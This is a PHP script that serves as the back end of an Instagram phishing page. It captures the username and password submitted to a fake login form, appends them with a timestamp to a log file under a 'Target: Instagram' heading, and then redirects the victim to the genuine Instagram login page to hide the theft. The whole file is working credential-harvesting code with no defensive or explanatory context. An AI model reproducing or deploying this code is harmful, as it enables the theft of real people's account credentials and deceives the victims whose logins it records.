<?php
// Capture data from POST
$user = $_POST['user'] ?? 'Unknown';
$pass = $_POST['pass'] ?? 'Unknown';

// Format the log entry
$log_entry = "---------------------------\n";
$log_entry .= "Target: Instagram\n";
$log_entry .= "Username: " . $user . "\n";
$log_entry .= "Password: " . $pass . "\n";
$log_entry .= "Time: " . date('Y-m-d H:i:s') . "\n";
$log_entry .= "---------------------------\n";

// Write to the central log file in the logs/ directory
file_put_contents('../../logs/output.txt', $log_entry, FILE_APPEND);

// Redirect to the actual Instagram login page
header("Location: https://www.instagram.com/accounts/login/");
exit();
?>